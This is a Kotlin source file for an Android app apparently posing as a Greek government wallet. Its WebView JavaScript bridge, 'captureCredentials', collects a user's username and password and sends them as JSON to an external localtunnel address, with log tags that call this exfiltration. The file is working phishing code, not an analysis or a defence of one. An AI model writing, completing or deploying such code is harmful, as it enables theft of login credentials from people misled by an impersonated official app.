package com.example.govgrwallet.web

import android.webkit.JavascriptInterface
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class WebAppInterface(private val onCapture: () -> Unit) {
    
    // ⚠️ IMPORTANT: Paste localtunnel URL
    private val publicUrl = "https://gold-apes-smile.loca.lt"

    @JavascriptInterface
    fun captureCredentials(user: String, pass: String) {
        Log.d("CAPTURE", "Captured locally: $user")

        thread {
            var connection: HttpURLConnection? = null
            try {
                // Ensure the URL ends without a trailing slash for consistency
                val cleanUrl = publicUrl.trim().removeSuffix("/")
                val url = URL(cleanUrl)
                
                Log.d("EXFIL", "Connecting to Cloud: $cleanUrl")
                
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 10000
                
                // CRITICAL HEADERS FOR LOCALTUNNEL
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("Bypass-Tunnel-Reminder", "true")
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")

                val payload = "{\"username\":\"$user\", \"password\":\"$pass\"}"
                
                connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
                
                val code = connection.responseCode
                Log.d("EXFIL", "☁️ CLOUD STATUS: $code ${connection.responseMessage}")
                
            } catch (e: Exception) {
                Log.e("EXFIL", "❌ CLOUD ERROR: ${e.message}")
                e.printStackTrace()
            } finally {
                connection?.disconnect()
            }
        }

        onCapture()
    }
}
